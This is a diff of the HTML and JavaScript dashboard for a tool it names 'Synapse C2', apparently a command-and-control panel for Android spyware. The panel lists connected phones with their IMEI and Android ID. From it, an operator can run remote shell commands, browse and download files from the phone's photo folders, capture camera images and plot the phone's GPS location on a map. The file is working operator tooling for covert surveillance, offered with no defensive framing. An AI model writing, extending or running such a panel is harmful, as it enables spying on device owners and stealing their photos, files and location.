+      <button data-tab="console">💻 Console</button>
+      <button data-tab="files">📁 Files</button>
+      <button data-tab="camera">📸 Camera</button>
+      <button data-tab="shell">⬛ Shell</button>
+      <button data-tab="map">🗺️ Map</button>
+    </div>
+
+    <!-- PANEL: LIVE FEED -->
+    <div class="tab-panel active" id="panel-feed">
+      <div class="feed-filter" id="feed-filter">
+        <button class="flt active" data-flt="all">All</button>
+        <button class="flt" data-flt="ping">🏓 Ping</button>
+        <button class="flt" data-flt="info">📋 Info</button>
+        <button class="flt" data-flt="shell">💻 Shell</button>
+        <button class="flt" data-flt="camera">📸 Camera</button>
+        <button class="flt" data-flt="files">📁 Files</button>
+        <button class="flt" data-flt="location">📍 Location</button>
+        <button class="flt" data-flt="error">❌ Errors</button>
+      </div>
+      <div class="live-feed" id="live-feed">
+        <div style="color:var(--dim);text-align:center;padding:60px 20px;font-size:14px">
+          <div style="font-size:40px;margin-bottom:10px">📡</div>
+          Awaiting real-time results via SSE...
         </div>
-        <div class="main">
-            <div class="stats-row">
-                <div class="stat"><div class="num" id="total-devices">0</div><div class="label">Total</div></div>
-                <div class="stat"><div class="num" id="online-devices">0</div><div class="label">Online</div></div>
-                <div class="stat"><div class="num" id="offline-devices">0</div><div class="label">Offline</div></div>
-                <div class="stat"><div class="num" id="result-count">0</div><div class="label">Results</div></div>
-            </div>
+      </div>
+    </div>
 
-            <div class="cmd-panel">
-                <div class="quick-actions">
-                    <button class="qbtn ping" disabled id="qb-ping" onclick="quickAction('ping','ping')">🏓 Ping</button>
-                    <button class="qbtn" disabled id="qb-info" onclick="quickAction('info','gather')">📋 Device Info</button>
-                    <button class="qbtn shell" disabled id="qb-shell" onclick="quickShell()">💻 Shell</button>
-                    <button class="qbtn" disabled id="qb-files" onclick="quickAction('files','list')">📁 Files</button>
-                    <button class="qbtn" disabled id="qb-location" onclick="quickAction('location','get')">📍 Location</button>
-                    <button class="qbtn camera" disabled id="qb-camera" onclick="quickAction('camera','capture')">📸 Camera</button>
-                </div>
-                <div class="cmd-row">
-                    <input type="text" class="mod-input" id="cmd-module" placeholder="module">
-                    <input type="text" class="act-input" id="cmd-action" placeholder="action">
-                    <input type="text" id="cmd-params" placeholder='params (JSON, e.g. {"cmd":"id"})'>
-                    <button class="send-btn" id="send-btn" disabled onclick="sendCommand()">
-                        <span class="btn-text">▶ Send</span>
-                        <span class="spinner"></span>
-                    </button>
-                </div>
-            </div>
-
-            <div class="result-area">
-                <div class="result-tabs">
-                    <button class="active" onclick="switchTab('feed')" id="tab-feed">📡 Live Feed</button>
-                    <button onclick="switchTab('camera')" id="tab-camera">📸 Camera</button>
-                    <button onclick="switchTab('files')" id="tab-files">📁 File Browser</button>
-                </div>
-                <div class="tab-content active" id="content-feed">
-                    <div class="result-feed" id="result-feed">
-                        <div class="empty-state"><div class="icon">📡</div>Awaiting results via SSE...</div>
-                    </div>
-                </div>
-                <div class="tab-content" id="content-camera">
-                    <div class="result-feed" id="camera-feed">
-                        <div class="empty-state"><div class="icon">📸</div>No camera captures yet</div>
-                    </div>
-                </div>
-                <div class="tab-content" id="content-files">
-                    <div class="result-feed" id="files-feed">
-                        <div class="empty-state"><div class="icon">📁</div>No file listings yet — send a "files" "list" command</div>
-                    </div>
-                </div>
-            </div>
+    <!-- PANEL: COMMAND CONSOLE -->
+    <div class="tab-panel" id="panel-console">
+      <div class="cmd-console" style="flex:1">
+        <div class="cmd-quick-actions">
+          <button class="btn" style="border-color:var(--green);color:var(--green)" onclick="quickCmd('ping','ping')" id="qb-ping" disabled>🏓 Ping</button>
+          <button class="btn" style="border-color:var(--accent);color:var(--accent)" onclick="quickCmd('info','gather')" id="qb-info" disabled>📋 Device Info</button>
+          <button class="btn" style="border-color:var(--yellow);color:var(--yellow)" onclick="quickShell()" id="qb-shell" disabled>💻 Shell Exec</button>
+          <button class="btn" style="border-color:var(--orange);color:var(--orange)" onclick="quickFileList()" id="qb-files" disabled>📁 List Files</button>
+          <button class="btn" style="border-color:var(--cyan);color:var(--cyan)" onclick="quickCmd('location','get')" id="qb-location" disabled>📍 Location</button>
+          <button class="btn" style="border-color:var(--purple);color:var(--purple)" onclick="quickCmd('camera','capture')" id="qb-camera" disabled>📸 Camera</button>
         </div>
+        <div class="cmd-row">
+          <input class="mod-input" id="cmd-module" placeholder="module" value="ping">
+          <input class="act-input" id="cmd-action" placeholder="action" value="ping">
+          <input class="params-input" id="cmd-params" placeholder='params JSON e.g. {"cmd":"ls -la"}' >
+          <button class="cmd-send" id="cmd-send-btn" disabled onclick="sendCommand()">▶ Send</button>
+        </div>
+        <div class="cmd-history" id="cmd-history">
+          <div class="cmd-empty">No commands sent yet</div>
+        </div>
+      </div>
     </div>
 
-    <!-- Image modal -->
-    <div class="modal" id="image-modal" onclick="closeModal()">
-        <img id="modal-img" src="" alt="Full size">
+    <!-- PANEL: FILE BROWSER -->
+    <div class="tab-panel" id="panel-files">
+      <div class="file-browser" style="flex:1">
+        <div class="file-toolbar">
+          <div class="breadcrumb" id="file-breadcrumb">📁 /</div>
+          <input class="path-input" id="file-path-input" placeholder="/sdcard/DCIM/Camera" value="/sdcard/DCIM">
+          <button class="btn primary" onclick="quickFileList()" id="qb-files2" disabled>List Files</button>
+          <button class="btn" onclick="clearFileBrowser()">Clear</button>
+        </div>
+        <div class="file-grid" id="file-grid">
+          <div style="color:var(--dim);text-align:center;padding:60px 20px;font-size:14px;grid-column:1/-1">
+            <div style="font-size:40px;margin-bottom:10px">📁</div>
+            Select a path and click "List Files" to browse
+          </div>
+        </div>
+      </div>
     </div>
 
-    <script>
-        const API = window.location.origin;
-        let selectedDevice = null;
-        let devices = {};
-        let resultCount = 0;
-        let sseConnected = false;
+    <!-- PANEL: CAMERA -->
+    <div class="tab-panel" id="panel-camera">
+      <div class="camera-panel" style="flex:1">
+        <div class="camera-controls">
+          <button class="btn" onclick="captureCamera()" id="qb-camera-capture" disabled>📸 Capture Photo</button>
+          <span style="font-size:11px;color:var(--dim)">Captured images appear below</span>
+        </div>
+        <div class="camera-gallery" id="camera-gallery">
+          <div style="color:var(--dim);text-align:center;padding:60px 20px;font-size:14px;grid-column:1/-1">
+            <div style="font-size:40px;margin-bottom:10px">📸</div>
+            No camera captures yet — select a device and click Capture
+          </div>
+        </div>
+      </div>
+    </div>
 
-        // ── Device polling ──────────────────────────────────────────
-        async function pollDevices() {
-            try {
-                const res = await fetch(API + '/api/devices');
-                const data = await res.json();
-                const list = data.devices || [];
-                const devMap = {};
-                list.forEach(d => { devMap[d.id] = d; });
-                devices = devMap;
-                renderDevices(list);
-                updateStats(list);
-            } catch(e) {
-                console.error('Poll error:', e);
-                document.getElementById('sse-dot').className = 'dot red';
-            }
+    <!-- PANEL: SHELL TERMINAL -->
+    <div class="tab-panel" id="panel-shell">
+      <div class="shell-panel" style="flex:1">
+        <div class="shell-input-row">
+          <input type="text" id="shell-input" placeholder="Enter shell command... (e.g. ls -la /sdcard)" onkeydown="shellKeydown(event)">
+          <button id="shell-exec-btn" disabled onclick="execShell()">▶ Execute</button>
+        </div>
+        <div class="shell-terminal" id="shell-terminal">
+          <div class="s-line">── Synapse Shell Terminal ──</div>
+          <div class="s-line" style="color:var(--dim)">Select an online device and type a command.</div>
+          <div class="s-line" style="color:var(--dim)">History: ↑↓ arrow keys.  Ctrl+L to clear.</div>
+          <div class="s-line">&nbsp;</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- PANEL: MAP -->
+    <div class="tab-panel" id="panel-map">
+      <div class="map-panel">
+        <div class="map-container" id="map-container"></div>
+        <div class="map-empty" id="map-empty">
+          <div style="text-align:center">
+            <div style="font-size:40px;margin-bottom:10px">🗺️</div>
+            Send a "location/get" command to see device on the map
+          </div>
+        </div>
+        <div class="map-pin-info" id="map-pin-info" style="display:none">
+          <div class="coords" id="map-pin-coords"></div>
+          <div class="meta" id="map-pin-meta"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- IMAGE LIGHTBOX MODAL -->
+<div class="modal-overlay" id="image-modal" onclick="closeImageModal()">
+  <div class="modal-close">&times;</div>
+  <img id="modal-image" src="" alt="Full size">
+</div>
+
+<!-- TOAST CONTAINER -->
+<div class="toast-container" id="toast-container"></div>
+
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script>
+// ============================================================
+// SYNAPSE C2 — DASHBOARD LOGIC
+// ============================================================
+const API = window.location.origin;
+let selectedDevice = null;
+let devices = {};
+let resultCount = 0;
+let sseConnected = false;
+let currentFeedFilter = 'all';
+let cameraImages = [];       // stored camera captures
+let shellHistory = [];       // shell command history
+let shellHistoryIdx = -1;
+let activeTab = 'feed';
+let mapInstance = null;
+let mapMarker = null;
+let fileEntries = [];        // latest file listing
+let pendingViewRequests = new Set(); // track explicit file view requests
+
+// Load persisted state
+try {
+  const saved = JSON.parse(localStorage.getItem('synapse_state') || '{}');
+  if (saved.selectedDevice) selectedDevice = saved.selectedDevice;
+  if (saved.shellHistory) shellHistory = saved.shellHistory;
+  if (saved.cameraImages) cameraImages = saved.cameraImages;
+  if (saved.lastPath) document.getElementById('file-path-input').value = saved.lastPath;
+} catch(e) {}
+
+function saveState() {
+  try {
+    localStorage.setItem('synapse_state', JSON.stringify({
+      selectedDevice, shellHistory: shellHistory.slice(-100),
+      cameraImages: cameraImages.slice(-50),
+      lastPath: document.getElementById('file-path-input').value
+    }));
+  } catch(e) {}
+}
+
+// ========== DEVICE POLLING ==========
+async function pollDevices() {
+  try {
+    const res = await fetch(API + '/api/devices');
+    const data = await res.json();
+    const list = data.devices || [];
+    devices = {};
+    list.forEach(d => { devices[d.id] = d; });
+    renderDeviceList();
+    updateStats(list);
+    if (sseConnected) document.getElementById('sse-dot').className = 'dot green';
+  } catch(e) {
+    document.getElementById('sse-dot').className = 'dot red';
+    document.getElementById('sse-status').textContent = 'API Unreachable';
+  }
+}
+
+function renderDeviceList() {
+  const container = document.getElementById('device-list');
+  const search = (document.getElementById('device-search').value || '').toLowerCase();
+  const list = Object.values(devices).filter(d => {
+    if (!search) return true;
+    return (d.id||'').toLowerCase().includes(search) ||
+           (d.info?.model||'').toLowerCase().includes(search) ||
+           (d.info?.hostname||'').toLowerCase().includes(search);
+  });
+  document.getElementById('device-count').textContent = '(' + list.length + ')';
+
+  if (list.length === 0) {
+    container.innerHTML = '<div style="color:var(--dim);text-align:center;padding:20px;font-size:12px">No devices found</div>';
+    return;
+  }
+
+  list.sort((a,b) => (b.online?1:0) - (a.online?1:0));
+  container.innerHTML = list.map(dev => {
+    const sel = selectedDevice === dev.id ? ' selected' : '';
+    const online = dev.online;
+    return `<div class="device-card${sel}" onclick="selectDevice('${escAttr(dev.id)}')">
+      <div class="dev-top">
+        <div class="dev-dot ${online?'online':'offline'}"></div>
+        <div class="dev-id">${escHtml((dev.id||'').substring(0,20))}${(dev.id||'').length>20?'…':''}</div>
+      </div>
+      <div class="dev-meta">
+        <span>${escHtml(dev.info?.model||'?')}</span> ·
+        Android <span>${escHtml(dev.info?.os_version||'?')}</span> ·
+        <span>${escHtml(dev.info?.arch||'?')}</span>
+        ${dev.has_fcm?' · 📲':''}
+      </div>
+    </div>`;
+  }).join('');
+
+  // Auto-select
+  if (!selectedDevice || !devices[selectedDevice]) {
+    const firstOnline = list.find(d => d.online);
+    if (firstOnline) selectDevice(firstOnline.id, true);
+  }
+  updateUIForSelection();
+}
+
+function updateStats(list) {
+  const l = list || Object.values(devices);
+  document.getElementById('st-total').textContent = l.length;
+  document.getElementById('st-online').textContent = l.filter(d=>d.online).length;
+  document.getElementById('st-offline').textContent = l.filter(d=>!d.online).length;
+  document.getElementById('st-results').textContent = resultCount;
+}
+
+function selectDevice(id, silent) {
+  selectedDevice = id;
+  if (!silent) renderDeviceList();
+  updateUIForSelection();
+  updateDeviceInfoPanel();
+  saveState();
+}
+
+function updateUIForSelection() {
+  const dev = devices[selectedDevice];
+  const online = dev?.online || false;
+  const els = ['qb-ping','qb-info','qb-shell','qb-files','qb-location','qb-camera',
+               'qb-files2','qb-camera-capture','shell-exec-btn','cmd-send-btn'];
+  els.forEach(id => {
+    const el = document.getElementById(id);
+    if (el) el.disabled = !online;
+  });
+}
+
+function updateDeviceInfoPanel() {
+  const panel = document.getElementById('device-info-panel');
+  const card = document.getElementById('device-info-card');
+  const dev = devices[selectedDevice];
+  if (!dev) { panel.style.display = 'none'; return; }
+  panel.style.display = 'block';
+  const info = dev.info || {};
+  card.innerHTML = [
+    ['Model', info.model], ['Brand', info.brand], ['SDK', info.sdk],
+    ['Release', info.release], ['Fingerprint', info.fingerprint],
+    ['Hardware', info.hardware], ['Android ID', info.android_id],
+    ['Hostname', info.hostname], ['Arch', info.arch],
+    ['OS Version', info.os_version], ['IMEI', info.imei]
+  ].filter(([,v]) => v).map(([k,v]) =>
+    `<div class="info-row"><span class="info-label">${escHtml(k)}</span><span class="info-value">${escHtml(String(v))}</span></div>`
+  ).join('') || '<div style="color:var(--dim);font-size:11px">No device info yet — send "info/gather"</div>';
+}
+
+// ========== COMMAND SENDING ==========
+const cmdHistory = [];
+
+async function sendCommand(module, action, params) {
+  const dev = devices[selectedDevice];
+  if (!dev || !dev.online) { toast('Device is offline','error'); return; }
+
+  const mod = module || document.getElementById('cmd-module').value.trim();
+  const act = action || document.getElementById('cmd-action').value.trim();
+  const paramsStr = params ? null : document.getElementById('cmd-params').value.trim();
+  let parsedParams = params || {};
+
+  if (!mod || !act) { toast('Module and action required','error'); return; }
+
+  if (!params && paramsStr) {
+    try { parsedParams = JSON.parse(paramsStr); }
+    catch(e) { toast('Invalid JSON: '+e.message,'error'); return; }
+  }
+
+  const btn = document.getElementById('cmd-send-btn');
+  btn.disabled = true; btn.textContent = '...';
+
+  // Save to history
+  cmdHistory.unshift({ module:mod, action:act, params:parsedParams, time:new Date().toISOString() });
+  if (cmdHistory.length > 20) cmdHistory.pop();
+  renderCmdHistory();
+
+  try {
+    const res = await fetch(API + '/api/command', {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ device_id: selectedDevice, module: mod, action: act, params: parsedParams })
+    });
+    const data = await res.json();
+    if (data.command_id) {
+      document.getElementById('cmd-params').value = '';
+      toast(`Sent: ${mod}/${act}`,'success');
+    } else {
+      toast('Error: '+(data.error||'Unknown'),'error');
+    }
+  } catch(e) {
+    toast('Send failed: '+e.message,'error');
+  }
+  btn.disabled = !(devices[selectedDevice]?.online);
+  btn.innerHTML = '▶ Send';
+}
+
+function quickCmd(module, action, params) {
+  document.getElementById('cmd-module').value = module;
+  document.getElementById('cmd-action').value = action;
+  document.getElementById('cmd-params').value = params ? JSON.stringify(params) : '';
+  sendCommand(module, action, params);
+}
+
+function quickShell() {
+  const cmd = prompt('Shell command:', 'id');
+  if (!cmd) return;
+  quickCmd('shell', 'exec', { cmd });
+}
+
+function quickFileList() {
+  const path = document.getElementById('file-path-input').value.trim() || '/sdcard/DCIM';
+  saveState();
+  quickCmd('files', 'list', { path });
+}
+
+function captureCamera() { quickCmd('camera', 'capture'); }
+
+function renderCmdHistory() {
+  const container = document.getElementById('cmd-history');
+  if (cmdHistory.length === 0) {
+    container.innerHTML = '<div class="cmd-empty">No commands sent yet</div>';
+    return;
+  }
+  container.innerHTML = cmdHistory.map((h,i) => `
+    <div class="cmd-history-entry" onclick="replayCmd(${i})" title="Click to replay">
+      <span class="h-mod">${escHtml(h.module)}</span>
+      <span class="h-act">/${escHtml(h.action)}</span>
+      <span class="h-params">${escHtml(JSON.stringify(h.params))}</span>
+      <span class="h-time">${fmtTime(h.time)}</span>
+    </div>
+  `).join('');
+}
+
+function replayCmd(i) {
+  const h = cmdHistory[i];
+  if (!h) return;
+  document.getElementById('cmd-module').value = h.module;
+  document.getElementById('cmd-action').value = h.action;
+  document.getElementById('cmd-params').value = JSON.stringify(h.params);
+  switchTab('console');
+  sendCommand(h.module, h.action, h.params);
+}
+
+// ========== SHELL PANEL ==========
+function shellKeydown(e) {
+  if (e.key === 'Enter') { e.preventDefault(); execShell(); }
+  else if (e.key === 'ArrowUp') { e.preventDefault(); shellNavHistory(-1); }
+  else if (e.key === 'ArrowDown') { e.preventDefault(); shellNavHistory(1); }
+  else if (e.key === 'l' && e.ctrlKey) { e.preventDefault(); clearShell(); }
+}
+
+function shellNavHistory(dir) {
+  if (shellHistory.length === 0) return;
+  shellHistoryIdx = Math.max(-1, Math.min(shellHistory.length-1, shellHistoryIdx + dir));
+  const input = document.getElementById('shell-input');
+  if (shellHistoryIdx === -1) input.value = '';
+  else input.value = shellHistory[shellHistory.length - 1 - shellHistoryIdx];
+}
+
+function execShell() {
+  const input = document.getElementById('shell-input');
+  const cmd = input.value.trim();
+  if (!cmd) return;
+  const dev = devices[selectedDevice];
+  if (!dev || !dev.online) { toast('Device offline','error'); return; }
+
+  // Add to terminal
+  const term = document.getElementById('shell-terminal');
+  term.innerHTML += `<div class="s-line s-cmd">$ ${escHtml(cmd)}</div>`;
+
+  // Add to history
+  shellHistory.push(cmd);
+  if (shellHistory.length > 200) shellHistory.shift();
+  shellHistoryIdx = -1;
+  input.value = '';
+  saveState();
+
+  // Send command
+  const btn = document.getElementById('shell-exec-btn');
+  btn.disabled = true; btn.textContent = '...';
+  fetch(API + '/api/command', {
+    method: 'POST', headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({ device_id: selectedDevice, module: 'shell', action: 'exec', params: { cmd } })
+  }).then(r => r.json()).then(data => {
+    if (!data.command_id) toast('Error sending shell command','error');
+  }).catch(e => toast('Shell send failed: '+e.message,'error')).finally(() => {
+    btn.disabled = !(devices[selectedDevice]?.online);
+    btn.textContent = '▶ Execute';
+  });
+}
+
+function clearShell() {
+  const term = document.getElementById('shell-terminal');
+  term.innerHTML = '<div class="s-line" style="color:var(--dim)">── Terminal cleared ──</div>';
+}
+
+// ========== FILE BROWSER ==========
+function clearFileBrowser() {
+  fileEntries = [];
+  document.getElementById('file-grid').innerHTML = `<div style="color:var(--dim);text-align:center;padding:60px 20px;font-size:14px;grid-column:1/-1">
+    <div style="font-size:40px;margin-bottom:10px">📁</div>File browser cleared</div>`;
+}
+
+function renderFileGrid(entries, path) {
+  fileEntries = entries;
+  const grid = document.getElementById('file-grid');
+  const breadcrumb = document.getElementById('file-breadcrumb');
+
+  // Update breadcrumb
+  if (path) {
+    const parts = path.split('/').filter(Boolean);
+    breadcrumb.innerHTML = '📁 ' + parts.map((p,i) => {
+      const subpath = '/' + parts.slice(0,i+1).join('/');
+      return `<span onclick="document.getElementById('file-path-input').value='${escAttr(subpath)}';quickFileList()">/${escHtml(p)}</span>`;
+    }).join('');
+    document.getElementById('file-path-input').value = path;
+    saveState();
+  }
+
+  if (!entries || entries.length === 0) {
+    grid.innerHTML = `<div style="color:var(--dim);text-align:center;padding:40px 20px;font-size:14px;grid-column:1/-1">
+      <div style="font-size:40px;margin-bottom:10px">📭</div>No files in this directory</div>`;
+    return;
+  }
+
+  // Detect likely image files and auto-fetch them
+  const imageExts = /\.(jpg|jpeg|png|gif|webp|bmp|svg|heic|heif)$/i;
+
+  grid.innerHTML = entries.map((f,i) => {
+    const name = f.name || f.id || '?';
+    const isImage = imageExts.test(name);
+    const icon = isImage ? `<img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='48' height='48' viewBox='0 0 48 48'%3E%3Crect fill='%23222836' width='48' height='48'/%3E%3Ctext fill='%236b7280' x='24' y='28' text-anchor='middle' font-size='20'%3E🖼%3C/text%3E%3C/svg%3E" alt="loading" class="loading-pulse" id="thumb-img-${i}">`
+           : `<span class="file-icon">${fileIcon(name)}</span>`;
+    const sizeStr = fmtSize(f.size);
+    const dateStr = f.date ? new Date(f.date).toLocaleDateString() : '—';
+
+    // Auto-fetch image thumbnails
+    if (isImage) {
+      setTimeout(() => fetchFileThumbnail(f, i), i * 200); // stagger requests
+    }
+
+    return `<div class="file-thumb" onclick="handleFileClick(${i})">
+      <div class="thumb-img-container">
+        <div class="thumb-overlay">IMG</div>
+        ${icon}
+      </div>
+      <div class="thumb-info">
+        <div class="thumb-name" title="${escAttr(name)}">${escHtml(name)}</div>
+        <div class="thumb-meta"><span>${sizeStr}</span><span>${dateStr}</span></div>
+      </div>
+      <div class="thumb-actions">
+        <button onclick="event.stopPropagation();downloadFile(${i})" title="Download">⬇ DL</button>
+        <button onclick="event.stopPropagation();viewFile(${i})" title="View">👁 View</button>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function fileIcon(name) {
+  const ext = (name||'').split('.').pop().toLowerCase();
+  const map = {jpg:'🖼',jpeg:'🖼',png:'🖼',gif:'🖼',webp:'🖼',mp4:'🎬',mp3:'🎵',
+               pdf:'📄',doc:'📝',docx:'📝',apk:'📦',zip:'🗜',txt:'📃',xml:'📋',json:'📋'};
+  return map[ext] || '📄';
+}
+
+function fetchFileThumbnail(file, idx) {
+  const dev = devices[selectedDevice];
+  if (!dev || !dev.online) return;
+  const fileId = file.id || file.path;
+
+  fetch(API + '/api/command', {
+    method: 'POST', headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({ device_id: selectedDevice, module: 'files', action: 'read', params: { file_id: fileId } })
+  }).then(r => r.json()).then(data => {
+    // Response will come via SSE — we'll handle it there
+  }).catch(() => {});
+}
+
+function handleFileClick(idx) {
+  const file = fileEntries[idx];
+  if (!file) return;
+  const name = (file.name||'').toLowerCase();
+  if (/\.(jpg|jpeg|png|gif|webp|bmp)$/i.test(name)) {
+    viewFile(idx);
+  } else {
+    downloadFile(idx);
+  }
+}
+
+function viewFile(idx) {
+  const file = fileEntries[idx];
+  if (!file) return;
+  const dev = devices[selectedDevice];
+  if (!dev || !dev.online) { toast('Device offline','error'); return; }
+  const fileId = file.id || file.path;
+  pendingViewRequests.add(fileId);
+  toast('Fetching file...','success');
+  quickCmd('files', 'read', { file_id: fileId });
+}
+
+function downloadFile(idx) {
+  const file = fileEntries[idx];
+  if (!file) return;
+  const dev = devices[selectedDevice];
+  if (!dev || !dev.online) { toast('Device offline','error'); return; }
+  const fileId = file.id || file.path;
+  pendingViewRequests.add(fileId); // also track for download
+  toast('Fetching file for download...','success');
+  quickCmd('files', 'read', { file_id: fileId });
+}
+
+// ========== SSE — REAL-TIME RESULTS ==========
+function connectSSE() {
+  const es = new EventSource(API + '/api/events');
+  es.onopen = () => {
+    sseConnected = true;
+    document.getElementById('sse-dot').className = 'dot green';
+    document.getElementById('sse-status').textContent = 'SSE Connected';
+  };
+  es.onmessage = (event) => {
+    try {
+      const result = JSON.parse(event.data);
+      handleResult(result);
+    } catch(e) { console.error('SSE parse:', e); }
+  };
+  es.onerror = () => {
+    sseConnected = false;
+    document.getElementById('sse-dot').className = 'dot red';
+    document.getElementById('sse-status').textContent = 'SSE Disconnected';
+    es.close();
+    setTimeout(connectSSE, 3000);
+  };
+}
+
+function handleResult(result) {
+  resultCount++;
+  document.getElementById('st-results').textContent = resultCount;
+
+  // Parse envelope
+  let parsed = null;
+  try { parsed = JSON.parse(result.data); } catch(e) {}
+
+  const envelopeType = (parsed?.type || '').toLowerCase();
+  const payload = parsed?.payload || {};
+  const payloadType = (payload?.type || '').toLowerCase();
+
+  // Determine module
+  let module = result.module || '';
+  if (!module) module = inferModule(envelopeType);
+  if (!module && payloadType) module = inferModule(payloadType);
+
+  // Handle by type
+  if (payload?.stdout !== undefined || envelopeType.includes('shell') || payloadType === 'shell') {
+    handleShellResponse(result, payload);
+  }
+  if (payload?.image_base64 || envelopeType.includes('camera') || payloadType === 'camera') {
+    handleCameraResponse(result, payload);
+  }
+  if (payload?.entries && Array.isArray(payload.entries)) {
+    handleFileListResponse(result, payload);
+  }
+  if (payload?.base64_data || payload?.mime_type || envelopeType.includes('fileread') || payloadType === 'file_read') {
+    handleFileReadResponse(result, payload);
+  }
+  if (payload?.lat !== undefined || envelopeType.includes('location') || payloadType === 'location') {
+    handleLocationResponse(result, payload);
+  }
+
+  // Always add to live feed
+  addToLiveFeed(result, parsed, payload, module);
+}
+
+function inferModule(t) {
+  const s = (t||'').toLowerCase();
+  if (s.includes('shell')) return 'shell';
+  if (s.includes('camera')) return 'camera';
+  if (s.includes('file_list')||s.includes('filelist')) return 'files';
+  if (s.includes('file_read')||s.includes('fileread')) return 'files';
+  if (s.includes('device')||s.includes('info')) return 'info';
+  if (s.includes('location')) return 'location';
+  if (s.includes('ping')) return 'ping';
+  if (s.includes('error')) return 'error';
+  return s;
+}
+
+// ---- Shell Response ----
+function handleShellResponse(result, payload) {
+  const stdout = payload?.stdout || '';
+  const stderr = payload?.stderr || '';
+  const exitCode = payload?.exit_code;
+  const term = document.getElementById('shell-terminal');
+  if (stdout) term.innerHTML += `<div class="s-line">${escHtml(stdout)}</div>`;
+  if (stderr) term.innerHTML += `<div class="s-line s-stderr">${escHtml(stderr)}</div>`;
+  if (exitCode !== undefined) {
+    term.innerHTML += `<div class="s-exit${exitCode!==0?' nonzero':''}">Exit: ${exitCode}</div>`;
+  }
+  term.scrollTop = term.scrollHeight;
+  // Switch to shell tab
+  switchTab('shell');
+}
+
+// ---- Camera Response ----
+function handleCameraResponse(result, payload) {
+  const b64 = payload?.image_base64 || '';
+  if (!b64) return;
+  const fmt = payload?.format || 'jpeg';
+  const w = payload?.width || 0;
+  const h = payload?.height || 0;
+  const sz = payload?.size_bytes || 0;
+  const imgSrc = `data:image/${fmt.toLowerCase()};base64,${b64}`;
+
+  // Add to camera gallery
+  cameraImages.unshift({ src: imgSrc, time: result.time || new Date().toISOString(), w, h, sz });
+  if (cameraImages.length > 50) cameraImages.pop();
+  renderCameraGallery();
+  saveState();
+
+  // Switch to camera tab
+  switchTab('camera');
+}
+
+function renderCameraGallery() {
+  const gallery = document.getElementById('camera-gallery');
+  if (cameraImages.length === 0) {
+    gallery.innerHTML = `<div style="color:var(--dim);text-align:center;padding:60px 20px;font-size:14px;grid-column:1/-1">
+      <div style="font-size:40px;margin-bottom:10px">📸</div>No camera captures yet</div>`;
+    return;
+  }
+  gallery.innerHTML = cameraImages.map((img,i) => `
+    <div class="camera-card">
+      <img src="${img.src}" onclick="showImageModal('${img.src}')" alt="Capture" loading="lazy">
+      <div class="cam-info">
+        <span>${fmtTime(img.time)}</span>
+        <span>${img.w}×${img.h} · ${fmtSize(img.sz)}</span>
+      </div>
+    </div>
+  `).join('');
+}
+
+// ---- File List Response ----
+function handleFileListResponse(result, payload) {
+  const entries = payload.entries || [];
+  const path = payload.path || result.path || document.getElementById('file-path-input').value;
+  renderFileGrid(entries, path);
+  switchTab('files');
+}
+
+// ---- File Read Response ----
+function handleFileReadResponse(result, payload) {
+  const b64 = payload?.base64_data || '';
+  const mime = payload?.mime_type || '';
+  const fileId = payload?.file_id || '';
+  if (!b64) return;
+
+  const isExplicitRequest = pendingViewRequests.has(fileId);
+  pendingViewRequests.delete(fileId);
+
+  if (mime.startsWith('image/')) {
+    const imgSrc = `data:${mime};base64,${b64}`;
+
+    // Update matching thumbnail in grid
+    if (fileEntries.length > 0 && fileId) {
+      const idx = fileEntries.findIndex(f => (f.id||f.path) === fileId);
+      if (idx >= 0) {
+        const thumbImg = document.getElementById('thumb-img-'+idx);
+        if (thumbImg) {
+          thumbImg.src = imgSrc;
+          thumbImg.classList.remove('loading-pulse');
         }
+      }
+    }
 
-        function renderDevices(list) {
-            const container = document.getElementById('device-list');
-            const countSpan = document.getElementById('device-count');
-            countSpan.textContent = '(' + list.length + ')';
+    // Only show modal for explicit user view/download requests
+    if (isExplicitRequest) {
+      showImageModal(imgSrc);
+      switchTab('files');
+    }
+  } else if (isExplicitRequest) {
+    // Non-image file: trigger download
+    const blob = b64toBlob(b64, mime);
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = fileId.split('/').pop() || 'download';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+    toast('Download started','success');
+  }
+}
 
-            if (list.length === 0) {
-                container.innerHTML = '<div class="empty-state">No devices connected</div>';
-                setQuickButtonsEnabled(false);
-                document.getElementById('send-btn').disabled = true;
-                return;
-            }
+// ---- Location Response ----
+function handleLocationResponse(result, payload) {
+  const lat = payload?.lat;
+  const lng = payload?.lng;
+  if (lat === undefined || lng === undefined) return;
 
-            container.innerHTML = '';
-            list.sort((a,b) => (b.online ? 1 : 0) - (a.online ? 1 : 0));
+  updateMap(lat, lng, payload?.accuracy, payload?.provider);
+  switchTab('map');
+}
 
-            list.forEach(dev => {
-                const card = document.createElement('div');
-                card.className = 'device-card' + (selectedDevice === dev.id ? ' selected' : '');
-                card.onclick = () => selectDevice(dev.id);
-                card.innerHTML = `
-                    <div class="id-line">
-                        <div class="dev-dot" style="background:${dev.online ? '#3fb950' : '#f85149'};box-shadow:${dev.online ? '0 0 8px #3fb950' : 'none'};"></div>
-                        <div class="dev-id">${esc(dev.id.substring(0,16))}...</div>
-                    </div>
-                    <div class="dev-info">
-                        <span>${esc(dev.info?.model || 'Unknown')}</span> · 
-                        Android <span>${esc(dev.info?.os_version || '?')}</span> · 
-                        <span>${esc(dev.info?.arch || '?')}</span><br>
-                        ${dev.online ? '🟢 Online' : '🔴 Offline'} · 
-                        ${fmtTime(dev.last_seen)}
-                        ${dev.has_fcm ? ' · 📲 FCM' : ''}
-                    </div>
-                `;
-                container.appendChild(card);
-            });
+// ========== LIVE FEED ==========
+function addToLiveFeed(result, parsed, payload, module) {
+  const feed = document.getElementById('live-feed');
+  // Clear empty state
+  const empty = feed.querySelector('div[style]');
+  if (empty && empty.textContent.includes('Awaiting')) feed.innerHTML = '';
 
-            // Auto-select first online device if none selected
-            if (!selectedDevice || !devices[selectedDevice]) {
-                const firstOnline = list.find(d => d.online);
